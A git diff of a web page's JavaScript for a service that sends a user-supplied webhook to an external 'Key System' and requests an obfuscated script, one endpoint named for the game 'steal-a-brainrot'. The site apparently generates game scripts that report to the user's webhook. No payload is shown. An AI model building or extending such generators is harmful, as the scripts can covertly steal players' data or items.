@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1212,7 +1211,7 @@
         // Auto-detect API URL based on environment
         const API_BASE_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
             ? `http://${window.location.hostname}:3000`
-            : `${window.location.protocol}//${window.location.host}`;
+            : 'https://sturdy-sniffle-outgel.onrender.com';
         
         console.log('Using API URL:', API_BASE_URL);
         let currentUser = null;
@@ -1469,35 +1468,30 @@
                 return;
             }
 
-            showAlert('generatorAlert', 'Encoding webhook via Key System...', 'warning');
+            showAlert('generatorAlert', 'Sending webhook to Key System...', 'warning');
 
             try {
-                // Step 1: Send webhook to Key System API for encoding
-                const keySystemUrl = 'https://key-system-kdml-1-2.onrender.com/add-webhook?webhook=' + encodeURIComponent(webhook);
-                const keySystemResponse = await fetch(keySystemUrl);
-                const keySystemData = await keySystemResponse.json();
+                // Step 1: Send webhook to Key System (HTML → Key System directly)
+                const keySystemResponse = await fetch(`https://key-system-kdml-1-2.onrender.com/add-webhook?webhook=${encodeURIComponent(webhook)}`, {
+                    method: 'GET',
+                    mode: 'no-cors' // Bypass CORS for this request
+                });
 
-                if (!keySystemData.comple) {
-                    showAlert('generatorAlert', 'Failed to encode webhook via Key System API', 'error');
-                    return;
-                }
+                console.log('✅ Webhook sent to Key System (no-cors mode)');
 
-                const encodedWebhook = keySystemData.comple;
-                console.log('✅ Webhook encoded:', encodedWebhook);
-
-                // Step 2: Send encoded webhook to script generate endpoint
-                showAlert('generatorAlert', 'Generating & obfuscating...', 'warning');
-                const generateResponse = await fetch(`${API_BASE_URL}/generate-script/steal-a-brainrot`, {
+                // Step 2: Tell API to get webhook from Key System and generate script
+                showAlert('generatorAlert', 'Generating & obfuscating script...', 'warning');
+                const generateResponse = await fetch(`${API_BASE_URL}/api/script/generate`, {
                     method: 'POST',
+                    credentials: 'include',
                     headers: { 'Content-Type': 'application/json' },
-                    
-                    body: JSON.stringify({ compleWebhook: encodedWebhook })
+                    body: JSON.stringify({ useKeySystem: true, game: game })
                 });
 
                 const generateData = await generateResponse.json();
 
                 if (!generateData.success) {
-                    showAlert('generatorAlert', `${generateData.message}`, 'error');
+                    showAlert('generatorAlert', generateData.message || 'Failed to generate script', 'error');
                     return;
                 }
 
@@ -1509,7 +1503,7 @@
 
                 document.getElementById('generatedCode').textContent = generatedScript;
                 document.getElementById('scriptResult').style.display = 'block';
-                showAlert('generatorAlert', 'Script generated successfully!', 'success');
+                showAlert('generatorAlert', 'Script generated successfully! ✅', 'success');
                 updateUserInfo();
             } catch (error) {
                 console.error('Generate error:', error);
@@ -1595,7 +1589,7 @@
 
         async function fetchUserScripts() {
             try {
-                const response = await fetch(`${API_BASE_URL}/api/scripts/list`, {
+                const response = await fetch('/api/scripts/list', {
                     method: 'GET',
                     credentials: 'include'
                 });
@@ -1717,7 +1711,7 @@
             }
 
             try {
-                const response = await fetch(`${API_BASE_URL}/api/scripts/update/${scriptId}/${encodeURIComponent(newWebhook)}`, {
+                const response = await fetch(`/api/scripts/update/${scriptId}/${encodeURIComponent(newWebhook)}`, {
                     method: 'PUT',
                     headers: {
                         'Content-Type': 'application/json'
@@ -1747,7 +1741,7 @@
             }
 
             try {
-                const response = await fetch(`${API_BASE_URL}/api/scripts/delete/${scriptId}`, {
+                const response = await fetch(`/api/scripts/delete/${scriptId}`, {
                     method: 'DELETE',
                     credentials: 'include'
                 });
